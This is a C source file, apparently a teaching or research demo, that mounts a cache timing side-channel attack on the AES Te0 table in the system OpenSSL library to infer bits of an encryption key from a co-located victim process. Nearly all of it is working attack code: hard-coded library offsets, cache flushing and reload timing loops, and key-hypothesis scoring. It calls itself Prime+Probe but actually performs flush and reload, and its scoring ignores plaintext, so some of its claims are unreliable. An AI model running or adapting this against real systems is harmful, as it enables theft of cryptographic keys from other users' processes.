/*
 * attack5_openssl_aes.c  —  Prime+Probe attack on OpenSSL AES-CBC
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * THEORY:
 *   OpenSSL's AES_encrypt() (T-table software path) does:
 *       output = Te0[pt[0] ^ key[0]] ^ Te1[pt[5] ^ key[5]] ^ ...
 *
 *   Each Te table is 1024 bytes (256 x 4-byte entries).
 *   Cache line = 64 bytes = holds 16 consecutive table entries.
 *   So Te0 has 16 cache lines (covering indices 0-15, 16-31, ..., 240-255).
 *
 *   The SPY monitors which cache lines of Te0 get accessed.
 *   If spy sees cache line N was hit → the index accessed was in [16N, 16N+15]
 *   → pt[0] XOR key[0] is in [16N, 16N+15]
 *   → key[0] is in [pt[0]^16N, pt[0]^(16N+15)]
 *
 *   With enough encryptions and varying plaintexts, we narrow to 1 candidate.
 *
 * WHAT THIS DEMO SHOWS:
 *   - Which cache lines of Te0 were accessed during each AES_cbc_encrypt call
 *   - How the access pattern changes with different plaintexts
 *   - Statistical analysis showing the most likely key byte 0 nibble
 *
 * SETUP:
 *   Terminal 1: ./attack5_openssl_aes
 *   Terminal 2: ./victim_openssl_aes
 *
 * BUILD:
 *   gcc -O0 -g -o attack5_openssl_aes attack5_openssl_aes.c \
 *       /path/to/Mastik/src/libmastik.a -lbfd -lelf \
 *       -I/path/to/Mastik
 *   (handled by 1_build.sh)
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <mastik/low.h>
#include "mastik_shared.h"

/* ── Configuration ──────────────────────────────────────────────────────── */
#define LIBCRYPTO_PATH  "/lib/x86_64-linux-gnu/libcrypto.so.3"

/*
 * Te0 file offset in libcrypto.so.3 (Ubuntu 24.04 / OpenSSL 3.0.13)
 * Found via: python3 -c "
 *   data=open('/lib/x86_64-linux-gnu/libcrypto.so.3','rb').read()
 *   print(hex(data.index(bytes([0x63,0x7c,0x77,0x7b]))))"
 */
#define TE0_OFFSET      0xb6ec0   /* Te0[0] = S-box entry 0x63 */
#define TE0_SIZE        1024      /* 256 entries × 4 bytes */
#define CACHE_LINE      64        /* bytes per cache line */
#define TE0_LINES       16        /* Te0 has 16 cache lines */

#define THRESHOLD       200       /* cycles — below = cache HIT */
#define NUM_SAMPLES     500       /* number of Prime+Probe rounds */
#define SLOT_CYCLES     400000    /* ~0.4ms per slot */

/* ── Key hypothesis tracking ─────────────────────────────────────────────── */
/* For each possible key byte 0 value (0x00-0xFF), count how many times
 * the cache line it would access was observed to be HOT */
static int key_score[256];

int main(void) {
    /* ── Map Te0 from shared libcrypto ─────────────────────────────────── */
    void *te0_base = shared_map_offset(LIBCRYPTO_PATH, TE0_OFFSET);
    if (!te0_base) {
        fprintf(stderr, "[!] shared_map_offset failed.\n");
        fprintf(stderr, "    Check LIBCRYPTO_PATH and TE0_OFFSET.\n");
        fprintf(stderr, "    Run: python3 -c \"\n");
        fprintf(stderr, "      d=open('%s','rb').read()\n", LIBCRYPTO_PATH);
        fprintf(stderr, "      print(hex(d.index(bytes([0x63,0x7c,0x77,0x7b]))))\"\n");
        return 1;
    }

    /* Map all 16 cache lines of Te0 */
    void *te0_lines[TE0_LINES];
    for (int i = 0; i < TE0_LINES; i++)
        te0_lines[i] = (char *)te0_base + i * CACHE_LINE;

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     ATTACK 5: Prime+Probe on OpenSSL AES-CBC (Te0)      ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║ Target  : AES Te0 table in %-31s║\n", LIBCRYPTO_PATH);
    printf("║ Te0 off : 0x%05x                                        ║\n", TE0_OFFSET);
    printf("║ Te0 ptr : %p (16 cache lines × 64 bytes)     ║\n", te0_base);
    printf("║ Threshold: %d cycles                                    ║\n", THRESHOLD);
    printf("║ Samples  : %d                                          ║\n", NUM_SAMPLES);
    printf("╚══════════════════════════════════════════════════════════╝\n\n");
    printf("[spy] Start victim_openssl_aes in another terminal.\n");
    printf("[spy] Monitoring Te0 cache lines during AES_cbc_encrypt...\n\n");
    printf("  Line# covers Te0 indices  (cache line in Te0 table)\n");
    printf("  ─────────────────────────────────────────────────────\n\n");

    int sample = 0;
    int total_hits = 0;

    while (sample < NUM_SAMPLES) {
        /* ── Step 1: Flush all Te0 cache lines (Prime = ensure cold) ──── */
        for (int i = 0; i < TE0_LINES; i++)
            clflush(te0_lines[i]);
        mfence();

        /* ── Step 2: Wait slot — victim's AES_cbc_encrypt runs here ───── */
        uint64_t deadline = rdtscp64() + SLOT_CYCLES;
        while (rdtscp64() < deadline) {}
        mfence();

        /* ── Step 3: Probe — reload each line and time it ──────────────── */
        int hits_this_round = 0;
        uint32_t times[TE0_LINES];

        for (int i = 0; i < TE0_LINES; i++) {
            uint32_t t1 = rdtscp();
            volatile char x = *(char *)te0_lines[i];
            times[i] = rdtscp() - t1;
            (void)x;
        }

        /* ── Step 4: Report and score ────────────────────────────────────*/
        for (int i = 0; i < TE0_LINES; i++) {
            if (times[i] < THRESHOLD) {
                /* Cache line i was hot — victim accessed Te0[i*16 .. i*16+15] */
                int lo = i * 16;        /* lowest index in this cache line */
                int hi = lo + 15;       /* highest index */
                printf("[sample %4d] Te0 line %2d HIT (idx %3d-%3d, reload=%3u cy)"
                       "  → key[0] XOR pt[0] ∈ [%02x..%02x]\n",
                       sample, i, lo, hi, times[i], lo, hi);
                fflush(stdout);

                /* Score all key[0] candidates that could produce this access */
                /* We don't know pt[0] here (spy doesn't know plaintext), but
                 * we record which lines were hot — aggregate across many samples */
                for (int k = lo; k <= hi; k++)
                    key_score[k]++;   /* Te0 index = pt[0] XOR key[0] */

                hits_this_round++;
                total_hits++;
            }
        }

        sample++;
    }

    /* ── Step 5: Statistical summary ──────────────────────────────────── */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf("  RESULTS: Te0 cache line access frequency over %d samples\n", NUM_SAMPLES);
    printf("══════════════════════════════════════════════════════════\n\n");
    printf("  Total cache line hits detected: %d\n\n", total_hits);

    printf("  Cache Line  |  Te0 idx range  |  Hit count  |  Bar\n");
    printf("  ──────────────────────────────────────────────────────\n");

    int max_score = 0;
    for (int i = 0; i < 16; i++) {
        /* Sum scores for this cache line's 16 indices */
        int line_score = 0;
        for (int j = i*16; j < i*16+16; j++)
            line_score += key_score[j];
        if (line_score > max_score) max_score = line_score;
    }

    for (int i = 0; i < TE0_LINES; i++) {
        int line_score = 0;
        for (int j = i*16; j < i*16+16; j++)
            line_score += key_score[j];

        int bar_len = max_score > 0 ? (line_score * 30) / max_score : 0;
        char bar[32] = {0};
        memset(bar, '#', bar_len);

        printf("  Line %2d     |  [%3d – %3d]    |  %5d      |  %s\n",
               i, i*16, i*16+15, line_score, bar);
    }

    printf("\n  Most frequently accessed Te0 range: indices ");
    int best_line = 0, best_score = 0;
    for (int i = 0; i < TE0_LINES; i++) {
        int s = 0;
        for (int j = i*16; j < i*16+16; j++) s += key_score[j];
        if (s > best_score) { best_score = s; best_line = i; }
    }
    printf("[%d – %d]\n", best_line*16, best_line*16+15);
    printf("  This means: key[0] XOR pt[0]  ∈  [0x%02x – 0x%02x]\n",
           best_line*16, best_line*16+15);
    printf("  (With known plaintext, recover key[0] exactly)\n");

    return 0;
}
